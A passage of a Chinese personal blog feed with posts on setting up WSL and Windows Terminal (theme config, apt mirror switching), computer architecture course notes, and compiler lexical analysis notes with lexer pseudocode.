<span class="string">&quot;#F2F2F2&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Dark&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Light&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom actions and keybindings to this array.</span></span><br><span class="line">  <span class="comment">// To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.</span></span><br><span class="line">  <span class="comment">// To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">  <span class="attr">&quot;actions&quot;</span>: [</span><br><span class="line">    <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">    <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">    <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;copy&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;singleLine&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;find&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+shift+f&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">    <span class="comment">// - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">    <span class="comment">// - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane&#x27;s profile.</span></span><br><span class="line">    <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;splitPane&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;split&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;splitMode&quot;</span>: <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>更改配置的几个地方（不要直接复制粘贴，一些值不同）<ul><li>更改<code>defaultProfile</code>，后面的值就粘贴<code>list</code>里面的几个项的<code>guid</code>，这是默认启动打开哪个命令行，我设置的是Debian的</li><li><code>initialRows</code>和<code>initialCols</code>设置打开后初始宽高</li><li><code>profiles</code>中的<code>defaults</code>是全局设置，可以对照更改。<code>list</code>里面就是Terminal管理的几个命令行软件，有刚装的debian，cmd，Powershell等</li><li>我在<code>list</code>里<code>Debian</code>的设置中加了<code>&quot;startingDirectory&quot;:&quot;//wsl$/Debian/home/tom/&quot;</code>，这是默认打开Debian后的目录，tom是我的用户名，大家可以改成自己的</li><li><code>schemes</code>中的配置是主题的一些配置，大家可以直接复制粘贴过去添加上</li><li><code>actions</code>中是快捷键的配置，大家自行参考</li></ul></li></ol><p>恭喜，至此Terminal配置完毕，我用的也是老师给的配置，觉得挺简约还挺好看的，一些其他更花里胡哨的配置请自行网上冲浪</p><h2 id="配置wsl"><a class="markdownIt-Anchor" href="#配置wsl"></a> 配置wsl</h2><p>言归正传，接下来我们可以使用terminal打开debian，可以在那个加号后面的向下的小箭头里面选择打开的命令行</p><h3 id="换源"><a class="markdownIt-Anchor" href="#换源"></a> 换源</h3><p>因为debian使用apt作为包管理器，而apt的默认服务器在国外，网速很慢，我们可以换到国内的镜像源来</p><ol><li><p>使用<code>su</code>切换到root权限</p></li><li><p>输入<code>cd /etc/apt</code>切换到对应目录</p></li><li><p>输入<code>cp /etc/apt/sources.list /etc/apt/sources.list_backup</code>备份一下源文件，出错的话便于还原</p></li><li><p>输入<code>nano sources.list</code>利用nano打开<code>sources.list</code>文件</p><blockquote><p>如果你会使用其他文本编辑器也是一样的<br />实在不会用的话也可以用记事本，wsl的根目录在windows的<code>C:\Users\Admin\AppData\Local\Packages\TheDebianProject.DebianGNULinux_76v4gfsz19hv4\LocalState\rootfs</code>下，其中用户名和装的Linux有出入，大家对照自己的就行<br />用记事本打开并做下面更改，保存即可</p></blockquote></li><li><p>删除所有内容，将以下内容复制粘贴进去**(命令行中复制和粘贴都是右键)**</p><p>debian源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 中科大源</span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br></pre></td></tr></table></figure><p>Ubuntu源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  阿里源</span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></li><li><p><code>ctrl+x</code>退出，输入<code>y</code>再点<code>enter</code>确定修改</p></li><li><p>换源完成</p></li></ol><h2 id="更新包"><a class="markdownIt-Anchor" href="#更新包"></a> 更新包</h2><ol><li><code>sudo apt update</code>会将新的包下载下来</li><li><code>sudo apt upgrade</code>会升级为最新的包，两条命令顺序不要反了</li><li>以后安装软件就可以<code>sudo apt install 软件名</code>了，嘻嘻，快捷方便</li></ol><h2 id="完成"><a class="markdownIt-Anchor" href="#完成"></a> 完成</h2><p>恭喜你，你的wsl已经搞定啦，享受Linux带来的快乐吧！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;之前上过一个Linux的选修课，了解了Linux系统的一些知识，越用越觉得一些需要命令行的软件用Linux来简直太方便了，这篇文章就介绍以下如何在windows系统上搭建Linux子系统（也就是wsl）（Windows Subsystem for Linux），这样就不用使用VMware来装虚拟机了&lt;/p&gt;</summary>
    
    
    
    <category term="wsl" scheme="https://wsw8.online/categories/wsl/"/>
    
    
    <category term="自学" scheme="https://wsw8.online/tags/%E8%87%AA%E5%AD%A6/"/>
    
    <category term="Linux" scheme="https://wsw8.online/tags/Linux/"/>
    
    <category term="wsl" scheme="https://wsw8.online/tags/wsl/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第一章_量化设计与分析基础</title>
    <link href="https://wsw8.online/archives/6f1a4250.html"/>
    <id>https://wsw8.online/archives/6f1a4250.html</id>
    <published>2021-05-02T02:14:01.000Z</published>
    <updated>2021-05-10T08:31:05.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-计算机的分类"><a class="markdownIt-Anchor" href="#1-计算机的分类"></a> 1. 计算机的分类</h2><h3 id="11-flynns分类"><a class="markdownIt-Anchor" href="#11-flynns分类"></a> 1.1 Flynn’s分类</h3><p>定义：基于指令流和数据流数量的计算机结构分类</p><ol><li><p>SISD</p><p>串行计算机、确定执行<br />在任一时钟周期只有单个指令流在CPU执行<br />在任一时钟周期只有单个数据流用作输入</p></li><li><p>SIMD</p><p>数据级并行、适用于处理高度规整操作的问题，如图像处理、同步和确定执行<br />在任一时钟周期，所有处理单元执行相同的指令<br />每个处理单元能对不同数据元素进行操作</p><span id="more"></span></li><li><p>MISD</p><p>少有<br />单个数据流进入多个处理单元<br />每个处理单元用单个数据流对数据进行独立操作</p></li><li><p>MIMD</p><p>线程级或任务级并行、可同步或异步、可确定或非确定<br />每个处理器可以执行不同的指令流<br />每个处理器可以对不同数据流进行操作</p></li></ol><h3 id="12-市场分类"><a class="markdownIt-Anchor" href="#12-市场分类"></a> 1.2 市场分类</h3><ol><li>个人移动设备</li><li>桌面计算机</li><li>服务器</li><li>集群/仓库级计算机</li><li>嵌入式计算机</li></ol><h2 id="2-系统结构定义和任务"><a class="markdownIt-Anchor" href="#2-系统结构定义和任务"></a> 2. 系统结构定义和任务</h2><h3 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h3><p>传统定义：由程序员（机器语言）看见的（计算）系统属性，即概念性结构和功能行为，以区分数据流动和控制逻辑设计的组成及物理实现</p><p>现代定义：在满足功能、性能和价格目标的条件下，设计、选择和互连硬件部件构成计算机</p><p>区分：</p><ol><li><strong>经典的计算机系统结构</strong>是机器语言程序员所看到的传统机器级所具有的属性。它确定计算机系统的软、硬件界面。</li><li><strong>计算机组成</strong>指的是计算机系统结构的逻辑实现，包括五大功能部件组成以及逻辑设计等。它着眼于机器级内各事件的排序方式与控制方式，各部件的功能以及各部件的联系。</li><li><strong>计算机实现</strong>指的是计算机组成的物理实现，包括处理机、主存等部件的物理结构，器件的集成度和速度功耗，模块、插件、底板的划分与连接，信号传输，电源、冷却及整机装配技术等。它着眼于器件技术和微组装技术，其中器件技术在实现技术中占主导作用。</li></ol><p>例题：</p><ol><li>主存容量与编址方式(按位、按字节、按字访问等)的确定属于<u>计算机系统结构</u></li><li>为达到所定性能价格比，主存速度应多快，在逻辑结构上需采用什么措施(如多体交叉存储等)属于<u>计算机组成</u></li><li>主存系统的物理实现，如存储器器件的选定、逻辑电路的设计、微组装技术的选定属于<u>计算机实现</u></li></ol><p>影响：</p><ol><li>相同的计算机系统结构的计算机可以有不同的计算机组成</li><li>相同的计算机组成可以有不同的计算机实现</li></ol><p>系列机：</p><p>​是指由一个制造商生产的具有相同的系统结构，但具有不同组成和实现的一系列不同型号的计算机</p><p>软件兼容性：</p><p>​同一个软件可以不加修改地运行于系统结构相同的各档机器上，而且运行结果一样，差别只是运行时间不同</p><p>向后兼容：</p><p>​在某一时间生产的机器上运行的目标软件能够直接运行于更晚生产的机器上</p><p>向上兼容：</p><p>​在低档机器上运行的目标软件能够直接运行于高档机器上</p><p>指令集系统结构ISA的7个重要特征：</p><ol><li>ISA的类型：现代通用寄存器结构、早期累加器结构</li><li>存储器访问：字节访问等</li><li>寻址方式</li><li>操作数类型和大小：8位字符、32位整型数</li><li>操作类型：数据传输，算术/逻辑</li><li>控制流指令：转移，子程序调用/返回</li><li>ISA编码：固定长度，可变长度</li></ol><h3 id="22-任务"><a class="markdownIt-Anchor" href="#22-任务"></a> 2.2 任务</h3><ol><li><p>考虑</p><p>摩尔定律：集成在一个计算机芯片上的元件数量每两年翻一番<br />经验法则：成本减少速度与密度增加速度成比例<br />性能趋势：带宽改进优于时延<br />经验法则：带宽增加速度与时延平方改进速度成比例</p></li><li><p>依据</p></li><li><p>量化原则</p></li></ol><h2 id="3-性能"><a class="markdownIt-Anchor" href="#3-性能"></a> 3. 性能</h2><p>SPEC率：一个测试程序在参考计算机上执行时间与被测计算机上执行时间的比值，越大说明被测计算机性能越高</p><p>Amdahl定律：采用更快执行方式后所带来的系统性能提高，与这种执行方式的使用频率或占总执行时间的比例有关</p><p>改进比例Fe：可改进部分执行时间与改进前整个任务的执行时间的比值</p><p>改进加速比Se：改进前改进部分的执行时间与改进后改进部分的执行时间的比值</p><p>改进后整个系统的加速比Sn=1/((1-Fe)+Fe/Se)</p><p>CPU<sub>time</sub> =指令数量*CPI*时钟周期</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-计算机的分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-计算机的分类&quot;&gt;&lt;/a&gt; 1. 计算机的分类&lt;/h2&gt;
&lt;h3 id=&quot;11-flynns分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#11-flynns分类&quot;&gt;&lt;/a&gt; 1.1 Flynn’s分类&lt;/h3&gt;
&lt;p&gt;定义：基于指令流和数据流数量的计算机结构分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;SISD&lt;/p&gt;
&lt;p&gt;串行计算机、确定执行&lt;br /&gt;
在任一时钟周期只有单个指令流在CPU执行&lt;br /&gt;
在任一时钟周期只有单个数据流用作输入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SIMD&lt;/p&gt;
&lt;p&gt;数据级并行、适用于处理高度规整操作的问题，如图像处理、同步和确定执行&lt;br /&gt;
在任一时钟周期，所有处理单元执行相同的指令&lt;br /&gt;
每个处理单元能对不同数据元素进行操作&lt;/p&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>编译原理第六章</title>
    <link href="https://wsw8.online/archives/e997863b.html"/>
    <id>https://wsw8.online/archives/e997863b.html</id>
    <published>2021-04-29T00:33:04.000Z</published>
    <updated>2021-05-10T08:29:25.322Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译原理第六章-词法分析"><a class="markdownIt-Anchor" href="#编译原理第六章-词法分析"></a> 编译原理第六章-词法分析</h1><p>词法分析：编译程序对源程序进行分析和目标程序合成，最终生成目标程序</p><p>预处理子程序（预处理器）功能：</p><ol><li>删除编辑用字符，如制表符、换页符等</li><li>删除注释</li><li>合并多个空白字符为单个空白字符</li><li>组合多个独立文件中的源程序</li><li>展开宏定义</li><li>条件编译的选择等</li></ol><span id="more"></span><blockquote><p>其中，2、3等也可以在词法分析的同时进行</p></blockquote><h2 id="1-词法分析概述"><a class="markdownIt-Anchor" href="#1-词法分析概述"></a> 1. 词法分析概述</h2><p>扫描源程序的字符串，按照词法规则，识别出单词符号作为输出；对识别过程发现的词法错误（非法的字符、不正确的常量、程序括号等）进行处理</p><p>词法分析器只执行一次：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084145085.png" alt="image-20210429084145085" /></p><p>词法分析器执行多次：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084219353.png" alt="image-20210429084219353" /></p><h2 id="2-词法分析器的输出形式"><a class="markdownIt-Anchor" href="#2-词法分析器的输出形式"></a> 2. 词法分析器的输出形式</h2><h3 id="21-单词的种类"><a class="markdownIt-Anchor" href="#21-单词的种类"></a> 2.1 单词的种类</h3><ol><li>标识符：用来命名程序中的实体，如类型、变量、函数、过程、标号等</li><li>基本字（关键字）：如if、while等</li><li>常量：各种类型的常量</li><li>运算符：如+、-、*、/等</li><li>（分）界符：如；、{、}等</li></ol><p>eg：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084743808.png" alt="image-20210429084743808" /></p><blockquote><p>留意最后的换行符‘\n’也是界符</p></blockquote><h3 id="22-单词的输出形式"><a class="markdownIt-Anchor" href="#22-单词的输出形式"></a> 2.2 单词的输出形式</h3><p>使用二元式表示：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084945101.png" alt="image-20210429084945101" /></p><h2 id="3-单词类别的划分"><a class="markdownIt-Anchor" href="#3-单词类别的划分"></a> 3. 单词类别的划分</h2><h3 id="31-单词的编码随类别不同而不同"><a class="markdownIt-Anchor" href="#31-单词的编码随类别不同而不同"></a> 3.1 单词的编码随类别不同而不同</h3><ol><li><strong>基本字、运算符、界符</strong>的数目是确定的，每个单词与它的类别码为一一对应的关系，即<strong>一字一码</strong>，故而它们的第二元可以空缺</li><li><strong>标识符</strong>通归一类</li><li><strong>常量</strong>可按整型、实型、字符型、布尔型等分类</li></ol><p>eg：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085538808.png" alt="image-20210429085538808" /></p><blockquote><p>通常用常数在常量表（标识符在符号表）中的位置（编号）作为它们的属性值</p></blockquote><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085737912.png" alt="image-20210429085737912" /></p><h3 id="32-单词的识别方法"><a class="markdownIt-Anchor" href="#32-单词的识别方法"></a> 3.2 单词的识别方法</h3><ol><li><p>标识符和关键字的识别</p><blockquote><p>需要<strong>超前搜索</strong>（多读一个字符以确认上一个结束）</p><p>读到 非 字母数字停止</p></blockquote></li><li><p>常数的识别</p><blockquote><p>部分常量需要超前搜索</p></blockquote></li><li><p>运算符的识别</p><blockquote><p>1个或多个符号构成</p><p>需要超前搜索</p></blockquote></li><li><p>界符的识别</p><blockquote><p>不需要超前搜索</p></blockquote></li></ol><h2 id="4-状态转换图"><a class="markdownIt-Anchor" href="#4-状态转换图"></a> 4. 状态转换图</h2><p>状态转换图是设计词法分析器的有效工具</p><p>状态图特点：</p><ol><li>有限的有向图</li><li>有向边上标记字符</li><li>唯一初态</li><li>若干终态（至少一个）</li></ol><p>图示：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429090825221.png" alt="image-20210429090825221" /></p><p>eg：</p><p>识别标识符和数字串的状态转换图：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091210263.png" alt="image-20210429091210263" /></p><p>它的流程图：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091340527.png" alt="image-20210429091340527" /></p><h2 id="5-词法分析器的设计"><a class="markdownIt-Anchor" href="#5-词法分析器的设计"></a> 5. 词法分析器的设计</h2><h3 id="51-单词符号"><a class="markdownIt-Anchor" href="#51-单词符号"></a> 5.1 单词符号</h3><p>标识符：begin、end、integer、if、then、else、function、read、write</p><p>无符号整型常量</p><p>运算符：-、*、&lt;、&lt;=、&lt;&gt;、=、&gt;、&gt;=、:=</p><p>分界符：；、（、）、</p><h3 id="52-状态转换图"><a class="markdownIt-Anchor" href="#52-状态转换图"></a> 5.2 状态转换图</h3><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091724175.png" alt="image-20210429091724175" /></p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091752010.png" alt="image-20210429091752010" /></p><blockquote><p>注意：有*标记的状态需要回退一个字符</p></blockquote><h3 id="53-一个示意算法"><a class="markdownIt-Anchor" href="#53-一个示意算法"></a> 5.3 一个示意算法</h3><p>以下是将会用到的变量、函数和过程</p><ol><li><p>cha</p><blockquote><p>字符变量，存放最新读入的字符</p></blockquote></li><li><p>token</p><blockquote><p>字符数组，存放已读入的字符序列</p></blockquote></li><li><p>getchar（）</p><blockquote><p>读入字符的过程，从输入字符串（源程序文件）中读入一个字符到变量cha中</p></blockquote></li><li><p>getnbc（）</p><blockquote><p>读入非空白字符的函数</p></blockquote></li><li><p>concat（）</p><blockquote><p>连接字符的过程，把cha中的字符连接到token数组的末尾</p></blockquote></li><li><p>letter（）</p><blockquote><p>判断字符是否为字母的函数，若cha中的字符是字母，返回true，否则返回false</p></blockquote></li><li><p>digit（）</p><blockquote><p>判断字符是否为数字的函数，同上</p></blockquote></li><li><p>retract（）</p><blockquote><p>回退字符的过程，将刚读入cha中的字符回退到输入字符串中，并将cha的值置为空白</p><p>实现方法：不需要真正回退，可以设置标记位。</p></blockquote></li><li><p>reserve（）</p><blockquote><p>处理保留字的函数，对存放在token中的字符串差保留字表，查到返回该保留字的类别编码，否则返回0（假定0不是任何单词符号的类别编码）</p></blockquote></li><li><p>bulidlist（）</p><blockquote><p>对token中的字符串查符号表，查到返回位置编号，否则将该串存入符号表，并返回它在符号表中的位置编号</p></blockquote></li><li><p>dtb（）</p><blockquote><p>将token中的数字串（字符串）转换成二进制，存入常数表中，并返回它在符号表中的位置编号。若已经存在，则直接返回它在表中的编号</p></blockquote></li><li><p>return（num，value）</p><blockquote><p>返回二元式函数，num为单词类别编码，value是单词在符号表中的位置编号，或是它在常数表中的位置编号，或是0</p></blockquote></li><li><p>error（）</p><blockquote><p>处理出现词法错误的过程。有一类词法错误可以在词法分析时发现，如出现字母表以外的非法字符。不和规则的常数等。但有一类词法错误例如if写成fi，词法分析会将fi当标识符处理，length中多了个空格，词法分析会将le和ngth当作两个标识符处理，这类错误要推迟到语法分析时才能发现，当作语法错误处理</p></blockquote></li></ol><p>伪代码：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Word_Struct LexAnalyze()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   start:  token:=‘’ ;</span><br><span class="line">              getchar();</span><br><span class="line">              getnb();</span><br><span class="line">              <span class="keyword">case</span> cha <span class="keyword">of</span> </span><br><span class="line">                ‘a’…‘z’:  <span class="keyword">begin</span> </span><br><span class="line">                  <span class="keyword">while</span> letter() <span class="keyword">or</span> digit() <span class="keyword">do</span></span><br><span class="line">                     <span class="keyword">begin</span> concat ();getchar() <span class="keyword">end</span>;</span><br><span class="line">                     retract(); c:= reserve();</span><br><span class="line">                     <span class="keyword">if</span> c = <span class="number">0</span> <span class="keyword">then</span> <span class="keyword">begin</span></span><br><span class="line">                        val:= buildlist(); return($ID,val)    end</span><br><span class="line">                    <span class="keyword">else</span> return(c,<span class="number">0</span>)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘<span class="number">0</span>’…‘<span class="number">9</span>’:  <span class="keyword">begin</span></span><br><span class="line">                 <span class="keyword">while</span> digit() <span class="keyword">do</span></span><br><span class="line">                   <span class="keyword">begin</span> concat();getchar() <span class="keyword">end</span>;</span><br><span class="line">                 retract(); val:=dtb();</span><br><span class="line">                 return($INT,val)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘ = ’:   return(<span class="number">$E</span>Q,<span class="number">0</span>);</span><br><span class="line">                ‘ - ’:    return($SUB,0); </span><br><span class="line">                ‘ * ’:   return($MUL,0);</span><br><span class="line">                ‘ ( ’:    return($LPAR,0);</span><br><span class="line">                ‘ ) ’:    return($RPAR,0);</span><br><span class="line">                ‘ ; ’:    return($SEM,0)</span><br><span class="line">                ‘ &lt; ’:   <span class="keyword">begin</span></span><br><span 